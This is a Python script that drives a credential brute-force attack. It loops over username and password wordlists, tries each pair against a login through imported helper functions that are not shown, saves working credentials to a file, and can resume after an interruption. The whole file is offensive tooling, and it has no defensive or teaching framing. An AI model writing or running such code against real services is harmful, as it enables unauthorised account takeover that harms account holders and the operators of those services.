from typing import Optional
from utils.brute_utils import create_session, try_login
from utils.files_utils import load_file, save_to_file
from settings import USERNAMES_FILE, PASSWORDS_FILE, PROGRESS_FILE, SUCCESS_FILE

def run_brute_force() -> None:
    """
    Runs a brute-force attack using username and password lists.

    The function loads previous successful combinations and progress,
    resumes from the last attempted combination if available, and 
    tries all username:password pairs. Successful attempts are saved
    to a file, and progress is recorded for resuming later.

    Handles KeyboardInterrupt to safely save progress if the user stops the script.
    """
    session = create_session()
    if not session:
        print("[!] Failed to create session.")
        return

    known_success = load_file(SUCCESS_FILE, as_set=True)
    progress_list = load_file(PROGRESS_FILE)
    last_combo: Optional[str] = progress_list[-1] if progress_list else None
    resume: bool = last_combo is None

    usernames = load_file(USERNAMES_FILE)
    passwords = load_file(PASSWORDS_FILE)
    if not usernames or not passwords:
        print("[!] Username or password files are empty.")
        return

    combo: Optional[str] = None  # track current attempt
    try:
        for username in usernames:
            for password in passwords:
                combo = f"{username}:{password}"

                if combo in known_success:
                    continue
                if not resume:
                    if combo == last_combo:
                        resume = True
                    continue

                print(f"[*] Attempting: {combo}")
                save_to_file(PROGRESS_FILE, combo)
                try_login(session, known_success, username, password)

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user. Saving progress and exiting.")
        if combo:
            save_to_file(PROGRESS_FILE, combo)

if __name__ == "__main__":
    run_brute_force()